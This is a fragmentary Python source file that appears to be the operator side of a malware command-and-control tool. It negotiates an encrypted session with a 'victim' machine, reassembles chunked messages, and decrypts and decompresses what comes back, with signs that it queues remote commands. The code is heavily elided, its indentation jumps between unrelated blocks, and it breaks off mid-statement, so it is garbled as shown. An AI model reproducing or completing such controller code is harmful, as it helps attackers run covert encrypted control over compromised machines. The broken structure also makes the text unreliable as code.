import socket, random, time, sys, threading, argparse, base64, zlib, html, csv, statistics
from decryption import decrypt_symmetric, handshake_initiate_parser
from encryption import encrypt_symmetric, derive_static_session_key
...
def send_msg(message, is_cached: bool):
    ...
    try:
        ...
        log_error("send message error: "+str(e))
        COMMAND_READY.set()
                ...
                if len(buffer["chunks"]) == buffer["total"]:
                    ...
                    try:
                        ...
                        if parsed and parsed.get("success"):
                            ...
                            derivation_result = derive_static_session_key(victim_eph_pub_pem, my_priv_key)
                            
                            if derivation_result and derivation_result.get("success"):
                                CURRENT_SESSION_KEY = derivation_result["aes_key"]
                                log_success("<ansigreen>Handshake: derived session key from victim's ephemeral key.</ansigreen>")
                                ...
                                log_error("Failed to derive session key during handshake.")
                    except Exception:
                        pass
                    ...
                    if CURRENT_SESSION_KEY:
                        ...
                        decryption_result = {"success": False, "message": "No session key"}
                    
                    if decryption_result and decryption_result.get("success") == True:
                        full_msg = decryption_result["message"]
                        try:
                            decompressed_data = zlib.decompress(full_msg)
                            full_msg = decompressed_data.decode("utf-8", errors="replace")
                        except zlib.error:
                            full_msg = full_msg.decode("utf-8", errors="replace")
                        except Exception as e:
                        ...
                        if decryption_result:
                            log_error("decryption error: "+decryption_result.get("message"))
                        else:
